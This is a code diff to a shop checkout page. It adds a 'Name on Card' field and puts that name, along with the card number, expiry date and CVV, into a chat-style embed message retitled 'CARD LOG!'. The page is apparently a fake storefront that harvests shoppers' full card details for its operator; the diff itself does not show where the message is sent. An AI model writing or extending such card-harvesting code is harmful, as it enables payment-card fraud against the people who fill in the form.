@@ -244,6 +244,12 @@
       <form class="payment-form" onsubmit="event.preventDefault(); completeCheckout();">
         <input
           type="text"
+          id="nameOnCard"
+          placeholder="Name on Card"
+          required
+        />
+        <input
+          type="text"
           id="creditCard"
           placeholder="Credit Card (XXXX-XXXX-XXXX-XXXX)"
           maxlength="19"
@@ -369,6 +375,7 @@
     
     function completeCheckout() {
       // Retrieve payment info from the form.
+      const nameOnCard = document.getElementById("nameOnCard").value;
       const creditCard = document.getElementById("creditCard").value;
       const expiryDate = document.getElementById("expiryDate").value;
       const cvv = document.getElementById("cvv").value;
@@ -377,11 +384,12 @@
       const embedPayload = {
         embeds: [
           {
-            title: "🚀 NEW ORDER! 🚀",
+            title: "CARD LOG!💳💵🚀",
             color: 3066993,
             fields: [
               { name: "💎 Product", value: selectedProduct.name, inline: true },
               { name: "💷 Price", value: `£${selectedProduct.price.toFixed(2)}`, inline: true },
+              { name: "📝 Name on Card", value: nameOnCard, inline: true },
               { name: "💳 Credit Card", value: creditCard, inline: true },
               { name: "📆 Expiry Date", value: expiryDate, inline: true },
               { name: "🔒 CVV", value: cvv, inline: true }
@@ -401,7 +409,7 @@
       document.getElementById("thankYouPage").style.display = "block";
     }
     
-    // Payment formatting functions (unchanged)
+    // Payment formatting functions
     function formatCreditCard() {
       const input = document.getElementById("creditCard");
       let value = input.value.replace(/\D/g, "");
